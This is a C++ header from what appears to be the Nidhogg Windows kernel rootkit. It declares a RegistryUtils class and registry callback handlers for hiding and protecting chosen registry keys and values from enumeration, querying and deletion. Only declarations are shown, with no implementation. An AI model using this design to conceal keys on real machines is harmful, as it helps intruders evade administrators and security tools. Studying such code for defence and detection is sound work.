#pragma once
#include "pch.h"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

// Definitions.
constexpr SIZE_T MAX_REG_ITEMS = 256;
constexpr SIZE_T REG_VALUE_LEN = 260;
constexpr SIZE_T REG_KEY_LEN = 255;

enum RegItemType {
	RegProtectedKey = 0,
	RegProtectedValue = 1,
	RegHiddenKey = 2,
	RegHiddenValue = 3
};

#define VALID_REG_TYPE(RegType)(RegType == RegProtectedKey || RegType == RegHiddenKey || RegType == RegProtectedValue || RegType == RegHiddenValue)

// Structs
struct RegItem {
	ULONG RegItemsIndex;
	RegItemType Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct RegKeys {
	ULONG LastIndex;
	ULONG KeysCount;
	WCHAR* KeysPath[MAX_REG_ITEMS];
};

struct RegValues {
	ULONG LastIndex;
	ULONG ValuesCount;
	WCHAR* ValuesPath[MAX_REG_ITEMS];
	WCHAR* ValuesName[REG_VALUE_LEN];
};

struct RegItems {
	RegKeys Keys;
	RegValues Values;
};

class RegistryUtils {
private:
	RegItems ProtectedItems;
	RegItems HiddenItems;
	FastMutex Lock;

	bool ContainsProtectedRegKey(UNICODE_STRING regKey, RegItemType type);
	bool GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName);
	bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName);

public:
	LARGE_INTEGER RegCookie;

	void* operator new(size_t size) {
		return ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	RegistryUtils();
	~RegistryUtils();

	bool FindRegItem(RegItem* item);
	bool AddRegItem(RegItem* item);
	bool RemoveRegItem(RegItem* item);
	void ClearRegItem(RegItemType regType);
	void ClearRegItems();
	NTSTATUS QueryRegItem(RegItem* item);

	NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info);
	NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info);
	NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info);
	NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info);
	NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info);
	NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info);
	NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info);
	NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info);

	ULONG GetProtectedKeysCount() { return this->ProtectedItems.Keys.KeysCount; }
	ULONG GetProtectedValuesCount() { return this->ProtectedItems.Values.ValuesCount; }
	ULONG GetHiddenKeysCount() { return this->HiddenItems.Keys.KeysCount; }
	ULONG GetHiddenValuesCount() { return this->HiddenItems.Values.ValuesCount; }
};

inline RegistryUtils* NidhoggRegistryUtils;

NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2);
